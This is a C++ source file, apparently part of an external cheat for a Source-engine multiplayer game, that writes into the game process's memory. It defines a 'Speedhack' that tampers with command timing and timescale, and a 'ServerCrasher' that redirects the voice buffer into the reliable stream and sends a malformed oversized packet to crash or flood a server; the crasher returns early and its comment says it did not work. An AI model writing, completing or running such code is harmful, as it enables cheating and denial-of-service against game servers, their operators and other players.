#include "DumbExploits.h"
#include "../sdk/CClientState.h"
#include "../globals.h"
#include "../utils/Memutils.h"

namespace Exploits {

    void Speedhack() {
        if (netChan.m_chokedCommands < 15)
            process->Write<double>(clientStateAddr + OFFSET_OF(&CClientState::m_nextCmdTime), std::numeric_limits<double>::max());
        else
            process->Write<double>(clientStateAddr + OFFSET_OF(&CClientState::m_nextCmdTime), 0.0);
        return;
        if (pressedKeys & KEY_ALT) {
            process->Write<float>(timescale, 15.0f);
        } else {
            process->Write<float>(timescale, 1.0f);
        }
    }

    // first concept didnt work shiet
    void ServerCrasher() {
        return;

        // set voicestream buffer to 0x3000 bytes into the reliable stream so we have a big buffer to works with
        // since the reliableStream is like 260k bytes
        netChan.m_streamVoice.m_data = (void *) ((uintptr_t) netChan.m_streamReliable.m_data + 0x3000);
        netChan.m_streamVoice.m_dataBytes = netChan.m_streamReliable.m_dataBytes - 0x3000;
        netChan.m_streamVoice.m_dataBits = netChan.m_streamVoice.m_dataBytes * 8;

        // also change the UtlMemory buffer accordingly
        netChan.m_voiceDataBuffer.m_memory = netChan.m_streamVoice.m_data;
        netChan.m_voiceDataBuffer.m_allocationCount = netChan.m_streamVoice.m_dataBytes;

        // maximum datagram size
        uint8_t data[0x40010];
        memset(data, 0, 0x40010);

        // either write 0x1000 away from max datagram size, or whatever the curent stream size is
        int32_t bytesToWrite = std::min(0x40010 - 0x3000/* - (netChan.m_sendStream.m_curBit / 8)*/, netChan.m_streamVoice.m_dataBytes);
        if (bytesToWrite <= 0)
            return;

        // change the curbit to reflect the amount of bytes we are writing 
        netChan.m_streamVoice.m_curBit = bytesToWrite * 8;

        // write 0xFF to get an invalid message - server will print the whole packet
        data[bytesToWrite - 2] = 0xFF;

        // write our data into the buffer ingame and then write the netchannel to reflect our changes
        VMemWrite(&process->ctx->process, process->proc.dirBase, (uint64_t) data, (uint64_t) netChan.m_streamVoice.m_data, bytesToWrite);
        process->Write<CNetChan>((uint64_t) clientState.m_netChan, netChan);
    }
}